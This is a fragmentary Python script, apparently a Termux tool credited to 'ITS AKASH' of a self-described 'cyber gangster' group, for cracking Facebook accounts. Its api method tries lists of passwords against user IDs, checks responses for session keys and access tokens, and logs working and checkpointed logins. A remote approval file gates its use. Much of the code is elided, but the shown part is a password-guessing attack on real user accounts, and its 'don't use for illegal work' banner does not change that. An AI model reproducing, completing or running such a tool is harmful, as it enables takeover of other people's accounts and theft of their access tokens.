# decoder by cobra linux command __Tools Owner ITS AKASH
# Python 3.11 ___WhatsApp 0184086517**
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100000966437797"])
	exit(" [*] FACEBOOK :  https://facebook.com/groups/1895523294067389/")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/AKASH-king-06/OLD/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;91m──────╚╝─────────────  
 ...
 > \033[0;92mDEVELOPER     : ITS AKASH
 > \033[0;95mFACEBOOK ID   : BANGLADESH ROYAL CYBER GANGSTER 71
 > \033[0;41mWHATSAPP      : 0880 0184086517*
 \033[0;96m> YOUTUBE         : BD R CY GS 71
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [AKASH] : %s/%s -> \033[0;92m [ AKASH-OK:%s ]- \033[0;93m[AKASH-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[AKASH-CP😭] %s|%s\033[0;97m         "%(uid, pw))
